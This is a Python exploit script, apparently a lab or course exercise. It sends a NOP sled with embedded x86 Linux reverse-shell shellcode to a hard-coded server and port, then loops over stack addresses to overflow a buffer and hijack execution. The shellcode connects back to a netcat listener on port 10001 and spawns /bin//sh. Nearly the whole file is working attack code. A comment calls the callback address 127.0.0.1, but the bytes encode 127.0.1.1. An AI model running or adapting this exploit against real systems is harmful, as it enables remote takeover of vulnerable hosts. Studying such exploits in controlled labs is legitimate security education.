#!/usr/bin python

import sys
import socket
import time
import struct


SERVER_IP = '129.10.156.30'
SERVER_PORT = 9907
# SERVER_PORT = 5555

IPADDR = b'\x7f\x00\x01\x01' #hex(127).hex(0).hex(0).hex(1) == 127.0.0.1
PORT = b'\x27\x11' # netcat port where exploit is hosted on, port 10001
SHELLCODE = b'\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68' + IPADDR + b'\x66\x68' + PORT + b'\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'



nop = b'\x90'


start_addr = 0xffffd000
end_addr   = 0xffffd558 
msg_header = struct.pack('HH', 1, 1024)
msg_nop_train =  ((nop * 437) + SHELLCODE + (nop * 438) + SHELLCODE)

while (start_addr < end_addr):
    return_addr = struct.pack("<L", start_addr)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((SERVER_IP, SERVER_PORT))
    print("Sending fake msg header")
    s.send(msg_header) 
    time.sleep(0.1)
    print("Sending NOP train")
    s.send(msg_nop_train)
    time.sleep(0.1)

    #need to now send a new msg with that keeps the stack cookie and the generated secret the same 
    ebp = start_addr

    ebp_send = struct.pack('<L', ebp)
    print("Sending msg overflow...")
    msg_overflow = nop + (ebp_send*8)
    s.send(msg_overflow)
    time.sleep(0.1)

    s.close()
    start_addr = start_addr + 16 

